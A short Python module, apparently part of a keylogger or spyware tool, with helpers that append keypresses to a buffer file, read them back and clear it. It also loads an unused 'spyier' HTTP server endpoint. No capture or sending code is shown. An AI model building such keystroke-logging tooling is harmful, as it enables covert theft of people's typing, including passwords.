import os
from dotenv import load_dotenv

load_dotenv() 

BUFFFER_FILE = os.getenv('BUFFER_FILE')
SPYIER_HTTP_SERVER_ENDPOINT = os.getenv('SPYIER_HTTP_SERVER_ENDPOINT')

def set_keypress(key):
    with open(BUFFFER_FILE, 'a') as file:
        file.write(key)

def get_keypress():
    with open(BUFFFER_FILE, 'r') as file:
        return file.read()

def reset_buffer():
    with open(BUFFFER_FILE, "w") as file:
        file.write("\n")